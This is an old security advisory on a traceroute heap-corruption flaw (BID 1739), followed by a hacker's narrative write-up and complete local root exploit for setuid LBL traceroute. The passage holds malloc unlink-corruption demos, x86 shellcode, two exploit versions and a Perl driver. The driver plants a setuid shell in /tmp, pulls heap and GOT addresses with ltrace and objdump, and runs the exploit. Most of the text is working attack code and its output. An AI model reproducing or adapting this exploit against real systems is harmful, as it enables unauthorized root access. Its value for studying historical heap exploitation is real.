@@ -1,0 +1,873 @@
+source: http://www.securityfocus.com/bid/1739/info
+
+Traceroute is a well-known network diagnostic tool used for analyzing the path on a network between two hosts. On unix systems, traceroute is typically installed setuid root because of its use of raw sockets. Certain versions of LBNL traceroute are vulnerable to an interesting attack involving freeing of pointers pointing to unallocated memory.
+
+When traceroute is executed with the arguments "-g x -g x", the function "savestr()" is called twice. savestr() does what strdup() does without the extra malloc() call and is used when parsing the hostname or "dotted quad notation" ip address argument to the -g parameter. It uses a block of pre-allocated memory instead of allocating memory itself. After the first instance of "-g" is parsed and savestr() is called, the pointer to the block used by savestr() is unallocated via free(). When the next gateway parameter (-g) is interpreted, savestr() is called again and the user data argument is written to the block of unallocated memory. Like in the first instance, free() is called on the pointer to where the data begins inside the old-buffer of unallocated memory. When free() doesn't find a valid malloc header before the pointer it is passed, traceroute crashes.
+
+What makes this possibly exploitable is that the region of memory to which the pointer points is user-controlled and can be written to with (somewhat) arbitrary data before free() is called. An attacker may be able to construct a malicious malloc() header and carefully stuff it into the first savestr() buffer, so that is there when free() looks for it after the second savestr(). What complicates exploitation of this issue are the functions involved with savestr(), inet_addr() and gethostbyname(), which limit the type of user data that can be put into the buffer (which would need to be binary). If pulled off, however, it may be possible to overwrite aribitrary locations in the heap (such as a function pointer) with arbitrary data.
+
+If successfully exploited this would yield local root access for the attacker. 
+
+            LBL traceroute exploit.
+
+         By Dvorak, Synnergy Networks
+                www.synnergy.net
+
+Vulnerable:
+	All versions of LBL traceroute using savestr.
+	See Chris Evans post in bugtraq
+	(http://www.securityfocus.com/archive/1/136215)
+Discovery:
+	Pekka Savola (pekkas@netcore.fi)
+	Published to bugtraq by: Chris Evans
+	(chris@ferret.lmh.ox.ac.uk)
+	http://www.securityfocus.com/archive/1/136215
+Exploit:
+	dvorak (dvorak@synnergy.net)
+Exploit successful:
+	RH 6.1 RH 6.2 Debian 2.2
+Exploit not successful:
+	Debian woody (didn't check source)
+	Slackware 7.1: non vulnerable traceroute
+	
+Patches
+-------
+
+Should come from your vendor. The flaw was published about two weeks
+ago, every vendor should have a patch by now.
+
+Description & Vulnerability
+---------------------------
+
+Please take a look at Chris Evans post:
+http://www.securityfocus.com/archive/1/136215
+
+Thanks
+------
+Scrippie (ronald@synnergy.net)
+ for the idea about MALLOC_TOP_PAD_ since that got me started again.
+
+Dethy (dethy@synnergy.net)
+Emphyrio (Robert van der Meulen, rvdm@cistron.nl)
+ both for valuable comments to the text.
+
+Sonnema en dr. Pepper
+ for providing the drinks needed to build the exploit.
+
+Exploit + Story
+---------------
+
+This text starts with the story about the exploit. The exploit can be found at the
+end, but getting it to work might require reading the story.
+
+I won't go into details about malloc internals because i think it's
+not needed and you should be able to find that out yourself. (ok
+probably closer to the truth is that i can't explain it as clear as
+the source of malloc does: i don't understand the malloc internals
+well enough to be able to explain it clearly.)
+
+What you should know is that the internals of malloc work with chunks
+in which they keep the data. Malloc gives out a pointer to the memory
+to the user. These pointers are actually ((char *)chunk)+8, hope that
+helps in the explanation. Its possible to get free() to work with
+incorrect chunks, which is the base for the exploit.
+
+Using nice ascii it looks like:
+
+chunk
+ |
+ |
+ +--->+--------------
+      | prev_size
+      +--------------
+      | size
+ +--->+--------------
+ |    | fd  or data
+ |    +--------------
+ |    | bk  or data
+ |    +--------------
+ |    | ....
+ |
+mem
+
+chunk is used as pointer in the internals of malloc while mem is the
+pointer given to the user. If the chunk is not being used (that is
+the chunk hasn't been given to the user using malloc() or the user
+has retunred the chunk) fd and bk are used to hold pointers. If chunk
+is in use they are used to hold data.
+
+
+What happens if free(mem) is called?
+
+First free() converts mem into a chunk ((char *)mem) - 8) on the
+Intel. free() then calls chunk_free() to do the rest.
+
+The chunk given to chunk_free() as argument will be called 'p' during
+the rest of the text. Using p->prev_size (the size of the previous
+chunk) and p->size (the size of chunk p) chunk_free() finds the
+previous chunk (called prev from now on) and the next chunk (called
+next from now on). It then checks if next and/or prev are chunks
+which aren't in use (by checking chunk->size & PREV_INUSE). If they
+aren't p is linked into the double linked list of free chunks using
+the fd and bk field of prev and/or next.
+
+This linking into the free chunks list is done using the macro
+'unlink':
+
+#define unlink(P, BK, FD) \
+{                         \
+  BK = P->bk;             \
+  FD = P->fd;             \
+  FD->bk = BK;            \
+  BK->fd = FD;            \
+}
+
+If we manage to let chunk_free call unlink() with a chunk of which
+the fields fd and bk have been filled in by us, we will be able to
+change values in memory:
+
+if chunk->fd = (int *) x and chunk->bk = (int *) y
+after an unlink() of that chunk
+x[3] will be y
+and
+y[2] will be x
+
+example source:
+
+[dvorak@redhat free]$ cat free.c
+void main(void) {
+	unsigned int *chunk;
+	int i;
+	unsigned int shellcode[10];
+	unsigned int ret_addr_2_change = 9;
+
+	/* Get some space */
+	chunk = malloc(0x8);
+
+	/* now setup the chunk to fool chunk_free()
+	   By making prev_size negative it will look
+         _after_ this chunk in stead of in front of it
+       */
+	chunk[0] = -0x10;	/* prev_size */
+	chunk[1] = 0x8;		/* size */
+	chunk[2] = shellcode;   /* fd */
+	chunk[3] = shellcode;   /* bk */
+
+	/* set fd to the adres of the return address - 3
+	   the minus 3 is needed because fd[3] will become bk
+	   bk will be set to point to our shellcode. Remember that
+	   bk[2] will be changed to contain fd so that there should be
+	   a jmp or so in the shellcode to skip that value.
+         */
+	chunk[4+2] = (int) (&ret_addr_2_change - 3);
+	chunk[4+3] = (int) (shellcode);
+
+	/* set shellcode to 0 so that we can see the change */
+	memset(shellcode, 0, sizeof(shellcode));
+
+	printf("ret before call: %x\n", ret_addr_2_change);
+	printf("address of ret: %x\n", &ret_addr_2_change);
+	printf("address of shellcode: %x\n", shellcode);
+	/* remember we give mem to free which finds the chunk based on
+         that */
+	free(chunk+2);
+
+	printf("ret now: %x\n", ret_addr_2_change);
+	for (i = 0 ; i < 10; i++) {
+		printf("sh: %d : %x\n", i, shellcode[i]);
+	}
+}
+[dvorak@redhat free]$ make free
+cc free.c -o free -g
+free.c: In function `main':
+free.c:8: warning: assignment makes pointer from integer without a
+cast
+free.c:15: warning: assignment makes integer from pointer without a
+cast
+free.c:16: warning: assignment makes integer from pointer without a
+cast
+free.c:1: warning: return type of `main' is not `int'
+[dvorak@redhat free]$ ./free
+ret before call: 9
+address of ret: bffffb44
+address of shellcode: bffffb48
+ret now: bffffb48
+sh: 0 : 0
+sh: 1 : 0
+sh: 2 : bffffb38
+sh: 3 : 0
+sh: 4 : 0
+sh: 5 : 0
+sh: 6 : 0
+sh: 7 : 0
+sh: 8 : 0
+sh: 9 : 0
+[dvorak@redhat free]$ exit
+
+As we can see we successfully overwrote the return address with the
+address of our shellcode. An extra example is at the end of the text
+(main difference is that prev is now located on the stack.) How do
+we use this to exploit traceroute ?
+
+First lets look at what we can do with traceroute:
+
+After parsing of the second -g option, just before the call to
+freehostinfo() the buffer looks like this:
+
+
+---------------------------------------------
+argument of first -g\x00argument of second -g
+------------------------^--------------------
+                        |
+Free will be called with this address as argument. After calculating
+the address of the chunk, free() will call chunk_free(). The pointer
+that chunk_free() receives will point to an address which contains
+the last 7 bytes of the argument to the first -g option terminated by a
+'\0' byte.
+
+What can we put into these 7 bytes? When looking at the source of
+traceroute we see that these 7 bytes will be the last 7 bytes of the
+argument supplied to the first -g option if and _only if_
+inet_addr(argument) or gethostbyname(argument) returns without an
+error. A quick look at the source of inet_addr gives us the
+information that it will return success with an argument of
+"ipaddr_in_dot_notation<space><what ever (binary data for instance)>"
+
+
+So we basically can get anything in those last 7 bytes except '\0'
+bytes. This leads to the following chunk fields:
+
+START of chunk
+| prev_size | size      |
+XX XX XX XX XX XX XX 00
+
+with XX non zero.
+
+Or converted to int's
+
+p->prev_size = 0xXX XX XX XX with no byte equal to zero.
+p->size = 0x00 XX XX XX with the msb equal to zero and the other 3
+bytes non zero.
+
+chunk_free finds it's next chunk using:
+
+((char *)p) + (p->size & ~(PREV_INUSE))   // PREV_INUSE = 0x01
+
+next will be searched at 0x00010101 bytes above p at the least or
+0x00ffffff bytes above p at most. Unfortunately this will never lead
+to next being in addressable memory space so here the exploit attempt
+ends.
+
+I was talking this over with Scrippie and he told me to take a look
+at some of the runtime parameters of the malloc system. One of these
+was the environment variable MALLOC_TOP_PAD_ which is used to pad
+sbrk calls. The result of MALLOC_TOP_PAD_ being set to 1000000 is
+that more then just the 1024 bytes required by traceroute are
+allocated using sbrk. Now next could be in addressable memory. Time
+for the real exploit.
+
+First attempt:
+
+The first address should be
+"1.2.3.4 \xe0\xff\xff\xff\x01\x01\x01\x00"
+
+chunk_free would lookup 'next' and find it addressable and zero
+(which would lead to a crash, at least it seemed to crash because of
+did, but looking at the malloc source suggests that is should work
+fine). It will then continue to find 'previous' which was -0x20 in
+size or located 32 bytes after 'p'. We could set the argument of the
+second -g option so that at 32 bytes after 'p' there would be a
+correct chunk which would, when used in the unlink(), lead to the
+return address being overwritten (and hopefully to root).
+
+The first problem showed immediately. One of the checks in
+chunk_free is:
+
+if (next == top(ar_ptr)) with ar_ptr = arena_ptr(p);
+
+Looking at the source of malloc.c one can see that this will lead to
+a crash of p points above the last block of malloced memory (ok this
+isn't 100% correct but it should suffice for the explanation). The
+last block of malloced memory is the block returned by the
+malloc(1024) call in savestr.c of traceroute, but this block is
+already free()'d after processing the first -g option, so p was
+pointing to far in memory. One byte to far to be exact. This was
+solved by not using 1.2.3.4 as ip-address but using 1.2.33 instead
+(which is legal - look at inet_addr.c).
+
+The exploit at that time looked like this:
+
+/*
+	Just some notes to myself while coding told me what to do etc.
+	The first argv explains it in more human language the second
+	was used by me to try to organize my thoughts.
+
+	argv0: bS
+
+      argv1: -g the ip_address then the fake data for chunk p
+	argv1: 1.2.3.4 \xc0\xff\xff\xff\x04\x01\x01\x00
+
+      argv2: -g the ip address then some padding then the fd and bk
+               pointers which should give us root.
+               The weird calculation for the address of the
+               shellcode is because we can't really use nops etc
+               because
+               part of the code is overwritten (bk[2] = fd ..)
+               so we try to calculate where is will be placed
+               this calculation turned out to be incorrect ;)
+	argv2: 123.123.123.123 addr_2_change_etc shellcode_addres
+             (0xc0000000 - 8 - (strlen(argv3) + 1) - (strlen(env) +
+1))
+
+      argv3: this argument will be used for the shellcode
+             including the extra jmp
+	argv3: jmp forward 12 bytes or so + nop nop nop + shellcode
+
+*/
+
+#include <stdio.h>
+
+
+char shellcode[] =
+"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/tmp/sh";
+
+char jmp_forward[] = "\xeb\x0c";
+
+/*
+ Stupid and useless function to convert an int to a character array
+ what happened to:
+ char p[5];
+ ((int *)p) = val;
+ p[4] = '\0';
+ ??
+ */
+void make_addr(char *res, unsigned int val)
+{
+	int i;
+	char *p = (char *) &val;
+
+	for (i = 0; i < 4; i++)
+		res[i] = (char) *p++;
+	res[i] = '\0';
+}
+
+int main(int argc, char *argv[])
+{
+	char addr1[1000];
+	char addr2[100];
+	char execute_me[100];
+	char *arg[] = {"./traceroute", addr1, addr2, execute_me, NULL};
+	char *env[] = {"MALLOC_TOP_PAD_=1000000", NULL};
+
+	char shell_addr[5];
+	char ret_addr[5];
+
+	/* the first argument -g option */
+	snprintf(addr1, sizeof(addr1), "-g9.2.3.3 "
+	                "\xc0\xff\xff\xff\x04\x01\x01");
+	/* yeah I am lazy d0h */
+	memset(execute_me, 0x41, 100);
+	strncpy(execute_me, jmp_forward, strlen(jmp_forward));
+	strcpy(execute_me+20, shellcode);
+
+	/* this calculation is already a little bit better, but
+	   still not good enough
+	 */
+	make_addr(shell_addr, 0xc0000000 - 8 - (strlen(arg[3]) + 1) -
+	                      (strlen(env[0]) + 1));
+	make_addr(ret_addr, strtoul(argv[1], 0, 0) - 12);
+
+	/* another failure.. in addr1 we set p->size to 0xffffffc0 or
+	   -0x40 so the ret_addr and shell_addr are definitly at the
+wrong
+	   spot, never drink and code is the lesson i guess.
+	 */
+
+	snprintf(addr2, sizeof(addr2), "-g1.2.3.4 %s %s", ret_addr,
+shell_addr);
+	/* talking about well hmm misplaced confidence in my own code */
+	printf("Going for root!!!\n");
+	execve(arg[0], arg, env);
+}
+
+Well as you can see in the comments i made an awful lot of stupid
+mistakes which all make sure the exploit can't work ;(.
+
+After trying the above exploit i got a crash (how suprising). The
+first problem was p being above the highest malloced block so i
+changed the ip address of the first -g option to 1.2.33. This
+eliminated the first crash.
+
+Looking further into the result of my exploit i noticed something
+weird:
+
+p->prev_size and p->size weren't even correct (that is they weren't
+0xffffffc0 and 0x00010101) and since both are essential for the
+exploit to work i looked further into this behaviour. After adding a
+couple of printf's to the traceroute source (i am absolutely no gdb
+guru) the following showed:
+
+traceroute-1.4a5]$ ./traceroute -g 245.245.245.245 -g 123.123.123.123
+#
+the first address of hi->name, this is the address of the buffer
+malloced in save_str
+#
+hi->name: 0804cf18
+
+#
+This is what the buffer looks like (well the 10 bytes before and the
+first 13 bytes of the buffer) after the first savestr in gethostinfo
+#
+gethost, savestr:
+00 00 00 00 00 00 09 04 00 00 32 34 35 2e 32 34 35 2e 32 34 35 2e 32
+                              ^
+^ is the start of the buffer, just before it you can see the p->size
+pointer which is 0x00000409(1033) 1032 for the size (1024 bytes data
+and 8 bytes for the size and prev_size fields). The +1 is because the
+PREV_INUSE is set.
+
+#
+after the calloc(addrs) in gethostinfo
+#
+gethost, calloc addrs:
+00 00 20 d3 04 08 09 04 00 00 32 34 35 2e 32 34 35 2e 32 34 35 2e 32
+
+#
+The address of hi (struct hostinfo *) is below the address of the
+buffer, which is logical because it has been calloc'd earlier then
+the malloc(1024) in savestr. The addrs are located above the buffer
+because they are calloc'd later.
+#
+hi: 0804cf08 hi->addrs: 0804d320
+
+#
+After the address is filled in into addrs, nothing to see because
+addrs is located above the buffer.
+#
+gethost, calloc addrs filled in:
+00 00 20 d3 04 08 09 04 00 00 32 34 35 2e 32 34 35 2e 32 34 35 2e 32
+
+#
+Back to the getopt loop, just after the return of getaddr(). In
+getaddr() the hostinfo struct and addrs have been free'd, as well as
+the buffer containing our data.
+#
+while getopt after getaddr:
+00 00 20 d3 04 08 f1 10 00 00 a0 7f 10 40 a0 7f 10 40 32 34 35 2e 32
+                              ^
+^ is the start of the buffer. As can be seen the contents have
+changed, this is because of the free(). Now that p is on the free
+list its fd and bk fields are in use and point to other free blocks.
+The first 8 bytes will be overwritten with this data and since we are
+putting in "1.2.33 etc" the first byte of our fake chunk will be
+overwritten (something to keep in mind).
+
+#
+After calloc(addrs) for the second -g option the buffer is suddenly
+zero'd out. The reason behind this is that the first calloc(addrs)
+calloc'd data after our buffer (which was still malloc'd at that
+time). Now that the buffer has been free'd the free memory is
+assigned to this calloc.
+#
+ gethost, calloc
+addrs:
+00 00 18 cf 04 08 11 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e1
+
+#
+Here we see that addrs indeed overlaps with our original buffer.
+#
+hi: 0804cf08 hi->addrs: 0804cf18
+
+#
+Then the converted ip-address gets filled in. And whats more those 4
+bytes are under our full control (they represent the parts of the ip-
+address given with the second -g option).
+#
+gethost, calloc addrs filled in:
+00 00 18 cf 04 08 11 00 00 00 7b 7b 00 7b 00 00 00 00 00 00 00 00 e1
+
+#
+segfault after the second free.
+#
+Segmentation fault (core dumped)
+
+So what do we have now?
+
+The first 4 bytes of the savestr buffer are under full control. And
+what is also nice is that the bytes placed after these 4 byte are
+zero as well as the bytes before the 4 bytes.
+
+So what's our next approach?
+
+the buffer will look like this:
+
+00 00 00 xx xx xx xx 00 00 00 00 00 00 00 00 00 00
+
+With xx under our full control. We want to control p->size and
+p->prev_size so we should make sure p points somewhere around those
+xx's
+
+What's a good place for it to point?
+
+Immediately at the start would be nice, but it would also mean that
+p->size is always 0 and thus that next would be the same as p, which
+gives less flexibility. The easiest is to let p point to the byte
+just before the xx's. That way prev_size would be 0xyyyyyy00 so that
+prev could be anywhere in memory (well not completely, the last byte
+of it's address can't be chosen but that shouldn't yield problems)
+and p->size would be 0x000000xx so that next is at little above 'p'.
+
+To get p to point to that addres free() should be called with p + 8
+or (since the xx are at the start of the savestr buffer) the first
+argument to -g should place 7 bytes in the buffer (including the \0
+byte). The exact value of these bytes doesn't matter since they will
+be overwritten.
+
+The second -g option should contain the ip address needed to get the
+correct value for p->prev_size and p->size. Next we should set up a
+prev record somewhere so that ((char *)p) - p->size should point to
+it, and it should contain a next record a little further in the
+second -g option.
+
+The new exploit:
+
+/*
+	argv0: at first it looks that this doesn't matter but since
+             this is the value found at the top of the stack and thus
+             it's length matter for the location of the shellcode.
+
+	argv0: bs
+
+      argv1: nothing is needed for this it should just contain
+             6 bytes and a 0 (and off course it should be acceptable
+             to inet_addr)
+	argv1: only specific length
+	       addr1 will become: 4 bytes from addr2 + zeros
+             length so that p->size = last byte + 3 zeros
+             p->prev_size = first 3 bytes + 00
+             thus: 6 bytes + 0
+             p data:
+             size = 0x20 or so;
+             prev_size = ((char *)p) - ((char *) eleet stack pointer)
+             p = addr2 - 7 - 8
+
+             so next data should be on addr2 + 0x20 - 7 - 8
+      argv2: this requires much more thought, the ip_address should be
+             so that p->prev_size and p->size make sense.
+             p->prev_size should be so that prev can be found on the
+             stack since that's an easy place to put it, p->size should
+             be 0x20 or so so that we can put the next chunk in this
+             argument too.
+	argv2: ip addres so that: p->size makes sure next is
+	       somewhere in argv2
+		p->prev_size should point to eleet data on stack (through
+		environment)
+		spacing: next data:
+			prev_size = 0x41414141;
+			size = 0xfffffff0
+			fd = some_random_pointer (or you could use him)
+			bk = some_random_pointer
+		after that: data for next (prev_size + size + fd + bk)
+		prev_size probably negative
+      argv3: contains the chunk used for prev and the shellcode
+             including the jmp.
+	argv3: eleet data on stack + eleet shellcode baby
+             eleet data:
+             prev_size = BS;
+             size = BS
+             fd = &ret_addr_change - 12
+             bk = shellcode;
+             shellcode = jmp forward + nops + code
+*/
+
+#include <stdio.h>
+
+/*
+easy shellcode - remember there is a certain trick in this baby like
+not starting /bin/sh but /tmp/sh (yes the 0 byte is written by the
+code itself so make sure there is something worthwhile in /tmp/sh
+ */
+char shellcode[] =
+"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/tmp/sh-O=";
+
+/*
+ code to jump forward
+ */
+char jmp_forward[] = "\xeb\x0c";
+
+/*
+ again the stupid make_addr function ;)
+ */
+void make_addr(char *res, unsigned int val)
+{
+	int i;
+	char *p = (char *) &val;
+
+	for (i = 0; i < 4; i++)
+		res[i] = (char) *p++;
+	res[i] = '\0';
+}
+
+/*
+ which argument number contains the leet_addr and the shellcode?
+ */
+#define LEETARG 7
+
+int main(int argc, char *argv[])
+{
+	char addr1[1000];
+	char addr2[1000];
+	char padding[256];
+	char execute_me[1000];
+	int execute_shift = 0;
+	/* next data: prev_size = crap, size=crap and fd and bk
+	   point to someplace innocent in the stack, if you want
+	   to you can use it to change a second memory place.
+	 */
+	char *next_data = "\x41\x41\x41\x41\xf0\xff\xff\xff"
+	                  "\xf0\xfd\xff\xbf\xf0\xfd\xff\xbf";
+	char *leet_data;
+	/*
+	 The arguments to start traceroute with, -g separated from its
+	 argument because of getopt.
+	 */
+	char *arg[] = {"/usr/sbin/traceroute", "-g", addr1, "-g",
+	           addr2, "127.0.0.1", "12", execute_me, NULL};
+	unsigned int leet_amount;
+	/*
+	 This needs some explanation: since the prev chunk will be at
+	 a certain distance from p we need to know p since it changes
+	 from binary to binary we'll let the attacker figure it out
+	 and give it to us ;).
+	 */
+	unsigned int p = strtoul(argv[2], 0, 0);
+
+	char shell_addr[5];
+	char ret_addr[5];
+
+	/* the first addr 6 bytes long */
+	snprintf(addr1, sizeof(addr1), "1.2.11");
+
+	/*
+	 First we fill execute_me (which will make the LEETARG) with
+	 0x41 thats both a NOP and easy to find on the stack.
+	 */
+	memset(execute_me, 0x41, sizeof(execute_me));
+
+	/*
+	 We put the shellcode and the jmp at the end of execute_me
+	 */
+	strncpy(execute_me+sizeof(execute_me)-strlen(shellcode)-20-1,
+	        jmp_forward, strlen(jmp_forward));
+	strcpy(execute_me+sizeof(execute_me)-strlen(shellcode)-1,
+	       shellcode);
+
+	/*
+	 Calculate the address of the shell_code
+	 the stack at startup looks like:
+	 arg4 arg5 arg6 argLEETARG environment arg0 4 bytes
+	 since the environment is gone and LEETARG is the last argument
+	 we only need the length of the shellcode and the length of arg0
+	 */
+	make_addr(shell_addr, 0xc0000000 - 4 - (strlen(arg[0]) + 1) -
+	          (strlen(shellcode) +1 + 20));
+	/*
+	 We also ask the attacker to give the address of the pointer to
+	 change to point to the shellcode. Something in the GOT is
+	 usually very nice
+	 */
+	make_addr(ret_addr, strtoul(argv[1], 0, 0) - 12);
+
+	/*
+	 leet_data should be in 0xbfff fe00 + (p & 0xff)
+	 now we calculate the address where chunk_free() will look for
+	 prev chunk.
+	 We put prev chunk somewhere between 0xbffffe00 and 0xbfffff00
+	 the precise position is defined by the lsb of p.
+	 */
+	printf("p: 0x%08x\n", p);
+	leet_data = (char *) (0xbffffe00 + ((int)p & 0xff));
+	printf("leet_data: 0x%08x\n", leet_data);
+	/*
+	 calculate the value of p->prev_size
+	 */
+	leet_amount = p - (0xbffffe00 + ((int)p & 0xff));
+	printf("leet_amount: 0x%08x\n", leet_amount);
+	
+	/* the end of execute_me will be on 0xc0000000 - 8
+	   length of execute_me should thus be:
+	   0xc0000000 - leet_data - 8
+	   2 possibilities: either don't put the fake prev chunk at the
+	   beginning of execute_me or change the length of execute_me
+	   we choose the latter.
+	 */
+	execute_shift = sizeof(execute_me) -
+	  (0xc0000000 - (int) leet_data - 4 - (strlen(arg[0]) + 1));
+	printf("execute_shift: %d\n", execute_shift);
+
+	arg[LEETARG] += execute_shift;
+
+	/*
+	 use strcpy not snprintf since snprintf does 0 terminated its
+	 strings
+	 */
+	strncpy(arg[LEETARG], "\x41\x41\x41\x41\x31\x31\x31\x31", 8);
+	strncpy(arg[LEETARG]+8, ret_addr, 4);
+	strncpy(arg[LEETARG]+12, shell_addr, 4);
+
+	printf("execute_len:%d arg0%d\n", strlen(arg[LEETARG]),
+	       strlen(arg[0]));
+	printf("execute_me_addr: %08x\n", 0xc0000000 - 4 -
+	       strlen(arg[0]) - strlen(arg[LEETARG]) - 2);
+
+	/*
+	 pad the second -g option to place next chunk on the expected
+	 position
+	 */
+	memset(padding, ' ', sizeof(padding));
+
+	/*
+	 0x20 - p->size
+	 - 7 because thats the size of addr1
+	 - 8 for p->size and p->prev_size
+	 - 12 for addr2 (xx.xx.xx.xx )
+	 */
+
+	padding[0x20 - 7 - 8 - 12] =  '\0';
+	printf("padding: %d bytes\n", strlen(padding));
+
+	/*
+	 put hex equivalent of leet amount in ip_address
+	 */
+	snprintf(addr2, sizeof(addr2),
+	         "0x%02x.0x%02x.0x%02x.0x%02x%s%s",
+	         ((unsigned char *) &leet_amount)[1], 	
+	         ((unsigned char *) &leet_amount)[2], 	
+	         ((unsigned char *) &leet_amount)[3], 	
+	         0x20,
+	         padding, next_data);
+	/*
+	 This time it should work ;)
+	 */
+	printf("Going for root!!!\n");
+	execve(arg[0], arg, NULL);
+}
+
+Well - that's it a working exploit for traceroute tested under redhat
+6.1, 6.2, debian potato if you have problems or solutions for certain
+questions raised in this text please contact me.
+
+
+oops indeed might have forgotten that:
+
+How to get the correct value for p?
+
+$cp /usr/sbin/traceroute ./tra
+$ltrace ./tra -g1
+
+ltrace can be found at:
+ftp.nluug.nl/pub/os/Linux/distr/debian/dists/stable/main/source/utils/
+ltrace.*.tgz
+
+Then look at the return value for the malloc(1024) call substract 1
+and voila. Copy the binary first as you can't ltrace a suid binary.
+
+A GOT entry is best as the address to change try exit(), getopt() or
+fprintf(). (if you don't know how to get a GOT address though luck,
+go read a couple of phracks or so and come back later).
+
+gtx.
+   Dvorak (dvorak@synnergy.net)
+
+P.S. I am very interested in any one who can come up with an easier
+exploit than this one. For an easier exploit it's needed to overcome
+the need for a small first argument at least that's what i think.
+
+P.P.S To exploit debian 2.2: debian has MAXHOSTLEN defined as 64 so
+argument 2 is to long: solution: move next chunk forward from 0x40 to
+0x20 or so. redhat 6.2 has the same problem therefore i patched the
+exploit myself.
+
+O.K. but just once ;)
+
+#!/bin/perl
+
+# build exploit
+system("make ex_god");
+
+system("echo 'void main(void) { setuid(0); setgid(0);
+execl(\"/bin/sh\", \"sh\", 0);}' > /tmp/sh.c ; make /tmp/sh >
+/dev/null 2>/dev/null");
+
+# get p
+system("cp /usr/sbin/traceroute ./tra; ltrace -e malloc -o lk ./tra
+-g1 > /dev/null 2>/dev/null; rm ./tra");
+
+open F, "<lk";
+
+$line = <F>;
+($dummy, $p) = split( /\= /, $line,2);
+$p = (hex $p) - 1;
+close F;
+
+# get a GOT entry
+open F, "objdump -R /usr/sbin/traceroute | grep getopt|";
+$line = <F>;
+($got, $dummy) = split( / /, $line, 2);
+close F;
+
+system("./ex_god 0x$got $p");
+
+--------------------
+
+/*
+ An other free example which places part of the chunk on the stack
+ */
+void main(int argc, char *argv[]) {
+	unsigned int *chunk;
+	int i;
+	unsigned int shellcode[10];
+	unsigned int ret_addr_2_change = 9;
+	unsigned int stack[1000];
+	char *p;
+
+	chunk = malloc(16455*4);
+	chunk = chunk + 22;
+	printf("malloc: %x\n", chunk);
+
+	/* prev_size */
+	chunk[0] = -(((char *) stack) - ((char *) chunk));
+	chunk[1] = 0x10;	/* size */
+	chunk[2] = -0x10;	/* fd */
+	chunk[3] = -0x10;	/* bk */
+
+	printf("re: %p\n", &ret_addr_2_change);
+	printf("sh: %p\n", shellcode);
+
+
+	chunk[4+0] = 0x41414141;	/* next */
+	chunk[4+1] = 0xfffffff0;
+	chunk[4+2] = (int) (&ret_addr_2_change - 3);
+	chunk[4+3] = (int) (shellcode);
+
+	stack[+0] = 0x1;		/* prev */
+	stack[+1] = 0x2;		
+	stack[+2] = shellcode+5;
+	stack[+3] = shellcode+5;
+
+	memset(shellcode, 0, sizeof(shellcode));
+
+	for (i = -4; i < 8; i++)
+		printf("chunk: %d: %08x\n", i, chunk[i]);
+	free(chunk+2);
+
+	printf("ret now: %x\n", ret_addr_2_change);
+	for (i = 0 ; i < 10; i++) {
+		printf("sh: %d : %x\n", i, shellcode[i]);
+	}
+}
+
